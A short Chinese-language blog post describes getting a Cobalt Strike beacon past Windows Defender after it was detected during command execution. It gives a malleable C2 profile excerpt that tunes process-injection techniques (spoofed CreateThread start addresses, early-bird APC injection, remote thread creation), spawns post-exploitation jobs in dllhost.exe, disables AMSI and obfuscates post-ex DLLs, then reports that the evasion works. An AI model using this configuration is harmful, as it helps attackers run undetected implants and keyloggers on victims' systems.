<!DOCTYPE html><html lang="zh"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="stylesheet" href="/css/post.css"><link rel="icon" href="/img/favicon.png"><title>难搞的Defender</title><meta name="generator" content="Hexo 5.4.0"><link rel="stylesheet" href="/css/prism.css" type="text/css"></head><body>　　<div class="inner"><h2>难搞的Defender</h2><p>静态处理过的程序，运行之后会因为一些CS的行为被杀，正常上线不操作没问题（前提要配置一份profile），当执行命令或者执行其他job的时候被杀，而且还能识别出来是CobaltStrike的行为。</p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220601192347325.png" alt="image-20220601192347325"></p>
<p>目前猜测有两个可能是特征，一是在shellcode下载beacon.dll回来运行CreateThread加载运行的时候，比如下面这个wwanmm.dll（看实际profile中的stage配置）</p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220601193230511.png" alt="image-20220601193230511"></p>
<p>另外就是spawn进程的时候也很可疑</p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220601192642827.png" alt="image-20220601192642827"></p>
<p>处理下配置文件，换个虚拟机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre class=" language-hljs txt"><code class="language-hljs txt">    execute &#123;<br>        #start address does not point to the current process space, fires SYSMON 8 events<br><br>        #self injection<br>        CreateThread "ntdll!RtlUserThreadStart+0x42";<br>        CreateThread "ntdll.dll!RtlUserThreadStart";<br>        CreateThread;<br><br>        #suspended process in post-ex jobs, takes over primary thread of temp process<br>        # SetThreadContext;<br><br>        #early bird technique, creates a suspended process, queues an APC call to the process, resumes main thread to execute the APC.<br>        NtQueueApcThread-s;<br><br>        #uses an RWX stub, uses CreateThread with start address that stands out, same arch injection only.<br>        #NtQueueApcThread;<br><br>        #no cross session<br>        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";<br><br>        #uses an RWX stub, fires SYSMON 8 events, does allow x86->x64 injection.<br>        #c2lint msg -> .process-inject.execute RtlCreateUserThread will cause unpredictable behavior with cross-session injects on XP/200<br>        RtlCreateUserThread;<br>    &#125;<br><br>post-ex &#123;<br>    # Optionally specify non-existent filepath to force manual specification based on the Beacon host&#x27;s running processes<br>    set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";<br>    # Hardcode paths like C:\\Windows\\System32\\dllhost.exe to avoid potential detections for %SYSNATIVE% use. !! This will break when attempting to spawn a 64bit post-ex job from a 32bit Beacon.<br>    set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";<br>    # change the permissions and content of our post-ex DLLs<br>    set obfuscate "true";<br>    # pass key function pointers from Beacon to its child jobs<br>    set smartinject "true";<br>    # disable AMSI in powerpick, execute-assembly, and psinject<br>    set amsi_disable "true";<br>    # Modify our post-ex pipe names<br>    set pipename "Win32\\StateListener-###-0,";<br>    set keylogger "GetAsyncKeyState";<br>    #set threadhint "module!function+0x##"<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到又正常能用了</p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220606233352776.png" alt="image-20220606233352776"></p>
<p><img src="/2022/06/12/%E9%9A%BE%E6%90%9E%E7%9A%84Defender/image-20220606233341329.png" alt="image-20220606233341329"></p>
<p>!</p>
</div><script src="/js/jquery.min.js"></script><script src="/js/main.js"></script></body></html>